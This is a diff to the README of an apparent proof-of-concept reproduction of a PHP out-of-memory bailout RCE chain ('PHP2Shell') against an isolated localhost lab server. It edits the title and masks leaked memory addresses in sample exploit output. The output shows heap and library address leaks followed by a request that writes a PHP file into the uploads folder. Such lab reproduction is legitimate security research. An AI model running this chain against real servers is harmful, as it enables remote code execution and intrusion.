@@ -1,4 +1,4 @@
-# PHP2Shell CVE-2026-109618 / CVE-2026-109619
+# PHP2Shell — CVE-2026-109618 / CVE-2026-109619
 
 Reproduction of the PHP2Shell Out-Of-Memory (OOM) bailout RCE chain on a pinned, isolated `php:8.4.26-apache` (mod_php) target. 
 
@@ -67,10 +67,10 @@ SAHMSEC target: http://127.0.0.1:8088/index.php
 Fixed command: cp /a /u/p.php
 [*] rotating the lab PHP worker
 [*] stage 1: looking for the PHP heap address
-[+] heap address: 0x7fc7b3400000
+[+] heap address: 0x7fc7b34XXXXX
 [*] rotating the lab PHP worker
 [*] stage 2: looking for the PHP library address
-[+] PHP library address: 0x7fc7b5004000
+[+] PHP library address: 0x7fc7b5004XXX
 [*] rotating the lab PHP worker
 [*] stage 3: sending the fixed proof request
 [+] proof: created http://127.0.0.1:8088/uploads/p.php
